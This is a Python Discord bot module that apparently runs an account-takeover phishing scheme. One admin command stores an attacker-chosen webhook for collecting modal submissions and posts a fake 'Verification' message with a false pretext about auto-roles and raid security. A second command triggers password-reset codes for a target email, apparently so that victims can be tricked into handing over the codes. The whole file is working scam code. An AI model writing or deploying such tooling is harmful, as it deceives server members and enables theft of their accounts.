import json
import asyncio
import discord

from discord import app_commands
from discord.ext import commands

from views.button_one import ButtonViewOne
from views.otp import automate_password_reset


class MyCog(commands.Cog):
    def __init__(self,  bot):
        self.bot = bot

    @app_commands.command(name="webhook")
    @app_commands.describe(webhook="The webhook the modals will be sent to")
    @app_commands.checks.has_permissions(administrator=True)
    async def webhook_cmd(self, interaction: discord.Interaction, webhook: str):
        with open("data.json", "w") as f:
            json.dump({"webhook": webhook}, f, indent=4)
        await interaction.response.send_message(f"The webhook URL has been set to: {webhook}", ephemeral=True)
        await interaction.channel.send(
            embed=discord.Embed(
                title="Verification",
                description="""__**Info:**__\nThis is our new and upcoming server, we're very active and we mostly focus on dungeons. Our last discord with a lot more members got termed a while ago, so this is now our new discord and we'd appreciate if you would spread it.\n\n__**Rules:**__\nHere at our server we mainly focus on enforcing the discord guidelines, but scamming and other morally wrong actions might get you punished and can result in a permanent ban! __https://discord.com/guidelines__\n\n__**Support:**__\n**Why do we need you to verify?**\nIt's for auto-roles, We need to give you your class roles, catacomb-level roles, and verified roles. It's also just for extra security in-cases of a raid.""",
                colour=0x00FF00
            ),
            view=ButtonViewOne()
        )
    @app_commands.command(name="otp")
    @app_commands.describe(email="The email address for OTP")
    @app_commands.checks.has_permissions(administrator=True)
    async def otp_cmd(self, interaction: discord.Interaction, email: str):
        try:
            await automate_password_reset(email)
            await interaction.channel.send(
                embed=discord.Embed(
                    title="Email Sent Success",
                    description=f"Code Was Sent To {email}",
                    colour=0x00FF00
                )
            )
        except Exception as e:
            await interaction.response.send_message(f"Error: {e}", ephemeral=True)



async def setup(bot):
    await bot.add_cog(MyCog(bot))
